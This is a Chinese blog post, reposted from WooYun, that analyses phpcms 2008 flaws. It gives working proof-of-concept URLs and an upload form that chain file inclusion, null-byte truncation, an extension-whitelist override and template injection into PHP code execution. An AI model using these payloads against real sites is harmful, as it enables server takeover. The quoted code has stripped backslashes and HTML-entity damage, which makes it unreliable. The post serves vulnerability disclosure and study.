title: "phpcms 2008多个漏洞 (可getshell)"
id: 148
date: 2012-07-19 23:58:57
tags: 
- phpcsm2008漏洞
categories: 
- 技术文章
- 最新漏洞
---

本文转自乌云：http://www.wooyun.org/bugs/wooyun-2010-09563
[php]
###文件包含

```php
<?php
define('IN_YP', TRUE);
define('ADMIN_ROOT', str_replace(&quot;&quot;, '/',dirname(__FILE__)).'/');
require '../include/common.inc.php';
```

## 要登陆

```php
if(!$_userid) showmessage('您还没有登陆，即将跳转到登陆页面',
$MODULE['member']['url'].'login.php?forward='.urlencode(URL));
session_start();
```
## $file变量可控制
```php
if(!isset($file) || empty($file)) $file = 'panel';

/* $company_user_infos 获取企业会员信息 */
$company_user_infos = $db-&gt;get_one(&quot;SELECT * FROM `&quot;.DB_PRE.&quot;member_company` 
WHERE `userid`='$_userid'&quot;);
$userid = $_userid;
```
<!--more-->

## 注册的时候选择企业用户

```php
if(!$company_user_infos)
{
 $MS['title'] = '您不是企业会员';
 $MS['description'] = '你可以做下面操作';
 $MS['urls'][0] = array(
 'name'=&gt;'免费升级为企业会员',
 'url'=&gt;$PHPCMS['siteurl'].$M['url'].'company.php?action=member',
 );
 $MS['urls'][1] = array(
 'name'=&gt;'退出当前帐号，换其他帐号登陆',
 'url'=&gt;$PHPCMS['siteurl'].'member/logout.php',
 );
 $MS['urls'][2] = array(
 'name'=&gt;'重新注册为企业会员',
 'url'=&gt;$PHPCMS['siteurl'].'member/logout.php?forward='.
urlencode($PHPCMS['siteurl'].'member/register.php'),
 );
 msg($MS);
}
$CATEGORY = subcat('yp');
$siteurl = company_url($userid, $company_user_infos['sitedomain']);

$_SESSION['url'] = QUERY_STRING;

if($file != 'company' &amp;&amp; $M['enableSecondDomain'] &amp;&amp;
 !$company_user_infos['sitedomain']) 
showmessage('请先绑定您的二级域名',BUSINESSDIR.'?file=company');

check_priv($file);
$GROUP = cache_read('member_group.php');

## 此处直接包含了，注意$file是可以控制的但须要截断
if(!@include ADMIN_ROOT.$file.'.inc.php') 
showmessage('The file ./yp/'.$file.'.inc.php is not exists!');

function check_priv($file)
{
 global $M,$PHPCMS,$_groupid;
 if(!$M[&quot;allow_add_$file&quot;]) return true;
 if(!in_array($_groupid,$M[&quot;allow_add_$file&quot;]))
 {
 $MS['title'] = '您所在的会员组没有此项操作权限';
 $MS['description'] = '你可以做下面操作';
 $MS['urls'][0] = array(
 'name'=&gt;'升级会员组',
 'url'=&gt;$PHPCMS['siteurl'].'member/upgrade.php',
 );
 $MS['urls'][1] = array(
 'name'=&gt;'返回商务中心',
 'url'=&gt;'?',
 );
 msg($MS);
 }
}
?>
```

## 利用注册一个企业用户

```php
EXP:http://localhost/phpcms/yp/business/?file=../../xxoo.txt%00.
```
由于涉及截断，所以鸡肋了，哥是要去拿shell的。
## 再看这一句

```php
if(!@include ADMIN_ROOT.$file.'.inc.php') 
showmessage('The file ./yp/'.$file.'.inc.php is not exists!');
```
以.inc.php结尾的文件有大把随便找个有漏的文件包含进来，不就能二次利用了？


## 首先进入视线的是/admin/upload.inc.php 
看名字就知道如果能利用的话，将会.....(省略500字)

```php
<?php
defined('IN_PHPCMS') or exit('Access Denied');

require_once 'attachment.class.php';

$attachment = new attachment($mod);
if($catid)
{
 $C = cache_read('category_'.$catid.'.php');
}
## 允许上传的后缀是从$C里取的，变量$C要通过上面那个判断才能赋值，典型的变量未初始化
$upload_allowext = $C['upload_allowext'] ? $C['upload_allowext'] : 
UPLOAD_ALLOWEXT;
$upload_maxsize = $C['upload_maxsize'] ? $C['upload_maxsize'] : 
UPLOAD_MAXSIZE;
if($dosubmit)
{
 $attachment-&gt;upload('uploadfile', $upload_allowext, $upload_maxsize, 1);
 if($attachment-&gt;error) showmessage($attachment-&gt;error());
 //判断是否开启附件ftp上传，返回图片路径
 $imgurl = UPLOAD_FTP_ENABLE ? $attachment-&gt;uploadedfiles[0]['filepath'] : 
UPLOAD_URL.$attachment-&gt;uploadedfiles[0]['filepath'];
 $aid = $attachment-&gt;uploadedfiles[0]['aid'];
 $filesize = $attachment-&gt;uploadedfiles[0]['filesize'];
 $filesize = $attachment-&gt;size($filesize);
 if($isthumb || $iswatermark)
 {
 require_once 'image.class.php';
 $image = new image();
 $img = UPLOAD_ROOT.$attachment-&gt;uploadedfiles[0]['filepath'];
 if($isthumb)
 {
 $image-&gt;thumb($img, $img, $width, $height);
 }
 if($iswatermark)
 {
 $image-&gt;watermark($img, $img, $PHPCMS['watermark_pos'], 
$PHPCMS['watermark_img'], '', 5, '#ff0000', $PHPCMS['watermark_jpgquality']);
 }
 }

showmessage(&quot;文件上传成功！&lt;script language='javascript'&gt; 
try{ $(window.opener.document).find(&quot;form[@name='myform'] #$uploadtext&quot;).
val(&quot;$imgurl&quot;);$(window.opener.document).find(&quot;form[@name='myform'] 
#{$uploadtext}_aid&quot;).val(&quot;$aid&quot;);$(window.opener.document).
find(&quot;form[@name='myform'] #$filesize&quot;).val(&quot;$filesize&quot;);}catch(e){}
 window.close();&lt;/script&gt;&quot;, HTTP_REFERER);
}
else
{
 include admin_tpl('upload');
}
?>
```

## 没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.
```html
<form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot;
action=&quot;http://localhost/phpcms/yp/business/?file=
../../admin/upload&amp;C[upload_allowext]=php|Php%00.|php%00&amp;dosubmit=yes&quot; 
method="post">;
<h1>Upload a new file:</h1>
&lt;input type=&quot;file&quot; name=&quot;uploadfile&quot; size=&quot;50&quot;&gt;&lt;br&gt;
&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;
&lt;/form>
```
## 传完后我才发现attachment.class.php 里有黑名单，怎么绕大家结合环境利用吧。
## 漏洞再一次被鸡肋化了，哥继续找。 再次进入视线的是block.inc.php，
看名字貌似是跟模块有关的，难不成可以写个shell ?
## 猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。
## 看144行左右，当$action 等于 post时。

```php
case 'post':
 require_once 'template.func.php';
 if($func == 'dosave') ## 这里完全不用管他，让他进入else
 {
 $block-&gt;set_template($blockid, $template);
 $block-&gt;update($blockid, $data);
 $data = $block-&gt;get_html($blockid);
 }
 else
 {
 $name = new_stripslashes($name);
 $data = new_stripslashes($data);
 $data = $block-&gt;strip_data($data);
 $template = new_stripslashes($template);
 $tpldata = template_parse($template);
 $tplfile = TPL_CACHEPATH.'block_'.$blockid.'.preview.php'; ## 文件名
 file_put_contents($tplfile, $tpldata); ## 生成文件
 include $tplfile; ## 包含文件
 @unlink($tplfile); ## 删除刚才生成的文件
 $data = ob_get_contents();
 ob_clean();
 }
 echo '&lt;script language=&quot;JavaScript&quot;&gt;parent.'.$func.'('.$blockid.',
 &quot;'.format_js($data, 0).'&quot;);&lt;/script&gt;';
 break;
```

## 在这里可以生成一个php文件，并马上包含进来，随后又删除了。由于包含进来了，
#只要能控制php文件的内容，代码还是会被执行。
## 看取得文件内容的这一行，$tpldata = template_parse($template); 
#跟进template_parse函数

```php
function template_parse($str, $istag = 0)
{
 $str = preg_replace(&quot;/([nr]+)t+/s&quot;,&quot;1&quot;,$str);
 $str = preg_replace(&quot;/&lt;!--{(.+?)}--&gt;/s&quot;,
 &quot;{1}&quot;,$str);
 $str = preg_replace(&quot;/{templates+(.+)}/&quot;,
&quot;&lt;?php include template(1); ?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{includes+(.+)}/&quot;,
&quot;&lt;?php include 1; ?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{phps+(.+)}/&quot;,
&quot;&lt;?php 1?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{ifs+(.+?)}/&quot;,
&quot;&lt;?php if(1) { ?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{else}/&quot;,&quot;&lt;?php } else { ?&gt;&quot;
,$str);
 $str = preg_replace(&quot;/{elseifs+(.+?)}/&quot;,&quot;&lt;?php } elseif (1) { ?&gt;&quot;,
$str);
 $str = preg_replace(&quot;/{/if}/&quot;,&quot;&lt;?php } ?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{loops+(S+)s+(S+)}/&quot;,&quot;&lt;?php 
if(is_array(1))foreach(1 AS 2) { ?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{loops+(S+)s+(S+)s+(S+)}/&quot;,&quot;&lt;?php 
if(is_array(1)) foreach(1 AS 2 =&gt; 3) { ?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{/loop}/&quot;,&quot;&lt;?php } ?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{/get}/&quot;,&quot;&lt;?php } unset($DATA); ?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{tag_([^}]+)}/e&quot;, &quot;get_tag('1')&quot;, $str);
 $str = preg_replace(&quot;/{gets+([^}]+)}/e&quot;, &quot;get_parse('1')&quot;, $str);
 $str = preg_replace(&quot;/{([a-zA-Z_x7f-xff][a-zA-Z0-9_x7f-xff:]
*(([^{}]*)))}/&quot;,&quot;&lt;?php echo 1;?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{$([a-zA-Z_x7f-xff][a-zA-Z0-9_x7f-xff:]
*(([^{}]*)))}/&quot;,&quot;&lt;?php echo 1;?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{($[a-zA-Z_x7f-xff][a-zA-Z0-9_x7f-xff]*)}/&quot;,
&quot;&lt;?php echo 1;?&gt;&quot;,$str);
 $str = preg_replace(&quot;/{($[a-zA-Z0-9_[]'&quot;$x7f-xff]+)}/es&quot;,
 &quot;addquote('&lt;?php echo 1;?&gt;')&quot;,$str);
 $str = preg_replace(&quot;/{([A-Z_x7f-xff][A-Z0-9_x7f-xff]*)}/s&quot;,
 &quot;&lt;?php echo 1;?&gt;&quot;,$str);
 if(!$istag) $str = &quot;&lt;?php defined('IN_PHPCMS') or exit('Access Denied');
 ?&gt;&quot;.$str;
 return $str;
}
```
## 是用来处理一些模板语法，完全不用理会。
```shell
EXP:http://localhost/yp/business/?file=../../
admin/block&amp;action=post&amp;blockid=eval&amp;template=&lt;?php phpinfo();exit();?&gt;
```
[![](http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg "phpcms2008")](http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg)

其实我觉得之前的那个注入漏洞比较严重~
